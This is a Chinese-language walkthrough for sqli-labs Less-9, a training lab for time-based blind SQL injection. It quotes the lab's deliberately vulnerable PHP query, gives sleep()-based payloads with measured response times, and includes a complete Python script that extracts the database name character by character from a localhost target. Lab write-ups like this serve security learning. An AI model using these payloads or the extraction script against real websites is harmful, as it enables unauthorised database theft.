# Less-9

> [总目录](README.md) ｜ [基础知识](00-基础知识.md) ｜ [完整版合集](Less-1-20-全合集.md)

| 项目 | 内容 |
|---|---|
| **注入类型** | GET · 时间盲注 |
| **闭合方式** | `'` |
| **成败信号** | 响应时间 |
| **一句话** | 只看响应时间 |
| **核心 payload** | `?id=1' and sleep(3)--+` |

---

**GET · 时间盲注 · 单引号**

### 源码

```php
$sql = "SELECT * FROM users WHERE id='$id' LIMIT 0,1";
if($row) { echo 'You are in...........'; }
else     { echo 'You are in...........'; }   // ← 注意！两个分支输出一样
```

### 特点：连布尔信号都没了

不管真假，页面都显示 `You are in...........`。这时只能靠 **`sleep()` 让数据库睡一会儿**，通过**响应时间**判断真假。

### 通关 payload（实测）

```
?id=1' and 1=1--+      →   259ms   （快）
?id=1' and sleep(3)--+ →  3260ms   （慢了 3 秒 → 注入成功）
```

### 时间盲注的完整套路

```python
import requests, time

url = "http://localhost/sqli-labs-master/Less-9/"
chars = "abcdefghijklmnopqrstuvwxyz0123456789@._-"
result = ""

for pos in range(1, 30):
    for ch in chars:
        payload = f"?id=1' and if(substr(database(),{pos},1)='{ch}',sleep(2),0)--+"
        t = time.time()
        requests.get(url + payload)
        if time.time() - t > 1.8:      # 真的睡了 2 秒
            result += ch
            print(result)
            break
    else:
        break
print("结果:", result)
```

> 💡 `if(条件, 真时执行, 假时执行)` 是 MySQL 的三元运算符，时间盲注的标配。
> ⚠️ 时间盲注**非常慢**，一次请求 2 秒，猜一个字符最多要 36×2 秒。实际渗透中只在万不得已时用。

---

[← Less-8](Less-08.md) ｜ [返回目录](README.md) ｜ [Less-10 →](Less-10.md)